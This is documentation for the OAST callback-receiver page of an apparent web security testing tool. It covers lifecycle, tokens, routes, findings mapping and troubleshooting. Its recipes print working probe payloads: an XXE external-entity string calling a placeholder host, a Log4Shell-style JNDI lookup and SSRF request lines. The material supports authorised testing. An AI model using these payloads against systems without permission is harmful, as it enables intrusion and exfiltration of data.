# OAST (out-of-band) — `/oast/`

A local HTTP callback receiver — point exfiltration probes (SSRF, XXE,
Log4Shell-style, blind RCE) at it and watch interactions arrive. Used
manually from [Repeater](repeater.md) / [Intruder](intruder.md), and
automatically by the [Scanner](scanner.md)'s `OASTSSRFCheck`.

> **HTTP-only.** No DNS exfiltration. Listens on `127.0.0.1:<random>`
> by default. The target must be able to reach this host.

## Where it is

- **URL:** `/oast/`
- **Nav:** *OAST* in the top bar.
- Status / tokens / interactions, all on one page.

## Quick start

1. Open `/oast/`. Click **Start receiver**. A random local port is
   bound; the base URL appears (e.g. `http://127.0.0.1:54311/`).
2. Click **New token**. A 12-char hex token + full callback URL appear
   (e.g. `http://127.0.0.1:54311/abc123def456/`).
3. Inject the callback URL into a probe — e.g. `url=` parameter,
   `http://OAST/p0`, XXE entity, JNDI `${jndi:ldap://OAST/x}`, etc.
4. Trigger the probe (via [Repeater](repeater.md) /
   [Intruder](intruder.md)).
5. Reload `/oast/`. Interactions appear in the table (newest first).
6. Done? **Stop receiver** to release the port.

## Routes

| URL                  | Method | What it does                                                          |
|----------------------|--------|-----------------------------------------------------------------------|
| `/oast/`             | GET    | Render status + token list + interaction log.                          |
| `/oast/start`        | POST   | Start the `LocalOAST` HTTP server on a random port.                    |
| `/oast/stop`         | POST   | `server.shutdown()` + `server.server_close()`.                         |
| `/oast/new-token`    | POST   | Generate a 12-char hex token. Auto-starts the receiver if stopped.     |
| `/oast/clear`        | POST   | Empty the interaction log.                                             |

## UI fields

No form fields — the page is button-driven (each button is a CSRF-protected POST).

## Behaviour

### Receiver lifecycle

- `LocalOAST(host="127.0.0.1", port=0)` stored in `app.extensions["reqlore_oast"]`.
- `start()` creates a `ThreadingHTTPServer`. Port `0` = OS picks a free port; the actual port is read back from `server.server_address`.
- `stop()` is graceful: `shutdown()` + `server_close()` releases the socket immediately so a restart on the same port (if you really want one) can succeed.

### Tokens

- `secrets.token_hex(6)` — 12 hex chars.
- **Not** a security boundary; tokens are correlation IDs.
- All tokens kept in `LocalOAST._tokens: set[str]`.

### Callback URL

- `base_url()` → `http://127.0.0.1:<port>`.
- `url_for(token)` → `http://127.0.0.1:<port>/<token>/`.
- Any child path is fine: `/<token>/p0`, `/<token>/anything?x=1`.

### Interaction detection

- HTTP handler accepts `GET`, `POST`, `PUT`, `DELETE`, `PATCH`, `HEAD`.
- First path segment is the token; if not known, it's logged as
  `"_"` (unknown — still surfaced).
- Records: method, full path+query, all headers, remote IP, body
  (UTF-8 if decodable, else base64), `bytes_in` (Content-Length).
- Response: `200 OK` with header `X-Reqlore-OAST: 1`.
- Log capped at 5000 entries (FIFO eviction).

### `Interaction` fields

| Field         | Type     | Notes                                                  |
|---------------|----------|--------------------------------------------------------|
| `ts_ms`       | int      | Epoch ms.                                              |
| `token`       | str      | Matched token or `"_"`.                                |
| `kind`        | str      | Always `"http"`.                                       |
| `remote`      | str      | Client IP.                                             |
| `method`      | str      | HTTP verb.                                             |
| `path`        | str      | Full path + query string.                              |
| `headers`     | list     | List of `(name, value)` tuples — all headers.          |
| `body`        | str      | Decoded text or base64.                                |
| `body_is_b64` | bool     | True iff `body` is base64.                              |
| `bytes_in`    | int      | Content-Length.                                        |

### Findings

`record_oast_interactions(project, interactions, probe_kind)` maps to
findings. `probe_kind` controls the title and CWE:

| `probe_kind`     | rule_id                          | CWE      | Severity |
|------------------|----------------------------------|----------|----------|
| `ssrf`           | `oast:ssrf-callback`             | CWE-918  | high     |
| `xxe`            | `oast:xxe-callback`              | CWE-611  | high     |
| `log4j` / `jndi` | `oast:log4j-callback`            | CWE-94   | critical |
| `rce`            | `oast:rce-callback`              | CWE-78   | critical |
| `blind`          | `oast:blind-callback`            | CWE-918  | medium   |

Evidence template: `OAST <kind> hit from <remote> at <method> <path> (<bytes_in> bytes; token=<token>)`.

## Accessibility notes

- Buttons reflect state via `disabled` (Start disabled while running, etc.).
- Tokens render in `<code>`; full URLs in `<a>` elements.
- Interactions table: `<caption>Newest first</caption>`, `<th scope="col">` headers.
- No live region — refresh the page to see new hits.

## How it integrates

**Producer:** none — OAST is purely a listener.

**Consumers:**

- [Scanner](scanner.md)'s `OASTSSRFCheck` — requires a running OAST. It generates a per-probe token, injects callback URLs into each query/form parameter, polls `oast.interactions(token=…)` for ~600 ms after each probe, and escalates hits to a `CWE-918` finding.
- [Intruder](intruder.md) — paste callback URLs into payloads; correlate hits manually by token.
- [Repeater](repeater.md) — same.

## Recipes

### Manual SSRF probe

1. **Start receiver** → **New token** (`abc123def456`).
2. In [Repeater](repeater.md):
   `GET /fetch?url=http://127.0.0.1:54311/abc123def456/p0 HTTP/1.1`.
3. **Send**.
4. Reload OAST. A row appears with method=GET, path=`/abc123def456/p0`.
   That's the target making the outbound call → SSRF confirmed.

### Active scanner SSRF

1. **Start receiver**.
2. In [Scanner](scanner.md), choose preset `default` (which includes
   `oast-ssrf` if the receiver is available).
3. Submit URLs. Findings appear as `oast:ssrf-callback` (CWE-918, high).

### XXE with file-disclosure exfiltration

Inject `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://OAST/x">]><foo>&xxe;</foo>`
into an XML-consuming endpoint. Hits arrive as `_` token (unless you
encode it inline) — check `path`.

### Log4Shell-style JNDI

Payload: `${jndi:ldap://127.0.0.1:54311/abc123def456/}`. JNDI clients
hit the HTTP endpoint first; even if you can't deliver an actual JNDI
class, the initial fetch lands.

### Rotate tokens between batches

Generate one token, use it in batch A. Click **Clear interactions**.
Generate another, use it in batch B. Now hits are partitioned by
batch.

## Storage footprint

**In-memory only.** Nothing is persisted to the `.rlr` project — the
log lives in `LocalOAST._interactions` and is bounded to 5000 entries.

`record_oast_interactions()` does write to the `issues` table when
invoked.

## CLI

No CLI surface. The receiver is bound to the Reqlore process lifetime.

## Troubleshooting

| Symptom                                                  | Cause                                                                  | Fix                                                                                              |
|----------------------------------------------------------|------------------------------------------------------------------------|--------------------------------------------------------------------------------------------------|
| No hits arriving                                          | Target can't reach `127.0.0.1:<port>`                                   | Use a public callback host instead, or run on the target's network.                              |
| Hits show `token=_`                                       | Probe hit a path that doesn't start with a known token                  | Either prefix the path with the token, or accept unknown hits as suspicious activity.            |
| Log feels truncated                                       | Bounded at 5000 entries                                                 | **Clear** between batches; export findings to keep history.                                      |
| Port reuse fails after stop                               | OS may hold TIME_WAIT briefly                                            | Re-start; OS will pick a different port (port=0).                                                 |
| `OASTSSRFCheck` reports "OAST not running"                | Receiver wasn't started before the scan                                 | Start the receiver, then re-run the scanner.                                                     |
| DNS-based exfiltration not detected                        | This is HTTP-only                                                       | Use a dedicated interactsh client for DNS exfil.                                                  |

## Test contract

`reqlore/tests/unit/test_oast.py`:

- `test_receiver_starts_on_random_port` — `port > 0`, `base_url` matches.
- `test_records_get_interaction` — GET → row with token, method, path.
- `test_records_post_body` — POST body decoded, `bytes_in` correct.
- `test_unknown_token_logged_as_underscore` — unknown token → `"_"`.
- `test_clear_resets_log` — clear empties the log.
- `test_stop_releases_socket` — stop + re-bind cleanly.
